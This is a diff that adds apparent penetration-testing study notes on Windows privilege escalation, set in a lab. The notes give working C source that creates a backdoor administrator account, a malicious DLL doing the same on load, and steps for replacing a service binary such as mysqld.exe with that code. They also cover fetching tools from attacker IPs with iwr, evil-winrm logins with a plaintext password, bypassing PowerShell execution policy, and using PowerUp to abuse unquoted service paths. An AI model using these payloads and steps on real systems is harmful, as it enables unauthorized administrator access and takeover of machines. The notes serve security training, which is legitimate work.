@@ -1394,3 +1394,195 @@ Can use Runas if access to GUI.  If no access to GUI try RDP or Winrm
 ```
 runas /user:backupadmin cmd
 ```
+
+### Powershell Info
+Get-History for basic history but this is often deleted
+
+```
+Get-History
+```
+
+Use PSReadline to get history file
+```
+(Get-PSReadlineOption).HistorySavePath
+type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+
+creating a PowerShell remoting session via WinRM in a bind shell like we used in this example can cause unexpected behavior
+
+To avoid any issues, let's use evil-winrm12 to connect to CLIENTWK220 via WinRM from our Kali machine instead. 
+
+```
+evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
+```
+use `iwr` command in windows to download a remote file
+```
+iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
+```
+### Service Binary Hijacking
+
+Get windows services and their path
+```
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+```
+
+use `icacls` on windows for file permissions
+```
+icacls "C:\xampp\apache\bin\httpd.exe"
+```
+
+if we spot a service with misconfigured permissions
+```
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}
+```
+
+then cross-compile
+```
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+```
+
+and move it to the windows machine, then overwrite the original while keeping a backup
+```
+iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
+move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
+move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
+```
+
+to start and stop services you need to be an admin
+```
+net stop mysql
+```
+
+Since we do not have permission to manually restart the service, we must consider another approach. If the service Startup Type is set to "Automatic", we may be able to restart the service by rebooting the machine.
+
+```
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
+```
+
+need to check if have permissions to restart system
+```
+whoami /priv
+```
+
+NOTE: the enabled/disabled only apply to the whoami process -- so just ignore it. all listed privileges are accessible by the user
+
+we shutdown a service as follows:
+```
+shutdown /r /t 0 
+```
+
+can use Powerup.ps1 to detect misconfigurations
+use -ep to start powershell with execution bypass
+```
+iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-ModifiableServiceFile
+```
+
+PowerUp also provides us an AbuseFunction, which is a built-in function to replace the binary and, if we have sufficient permissions, restart it. The default behavior is to create a new local user called john with the password Password123! and add it to the local Administrators group.
+```
+Install-ServiceBinary -Name 'mysql'
+```
+
+### Service DLL Hacking
+Can use Process Monitor to display info about process and detect missing DLLs
+
+Restart service in powershell
+```
+Restart-Service BetaService
+```
+
+get path windows
+```
+$env:path
+```
+
+basic microsoft dll
+```
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+```
+
+malicious dll
+```
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user dave2 password123! /add");
+  	    i = system ("net localgroup administrators dave2 /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+```
+
+for cross-compiling a dll we need to add the --shared flag
+```
+x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
+```
+
+### Unquoted Service Paths
+
+We can use this attack when we have Write permissions to a service's main directory or subdirectories but cannot replace files within them.
+
+use wmic to find unquoted service paths
+```
+wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+```
+can also use Powerup to identify unquoted services
+```
+iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-UnquotedService
+```
+
+we can then use Powerup to create new user binary
+```
+Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
+Restart-Service GammaService
+net user
+net localgroup administrators
+```
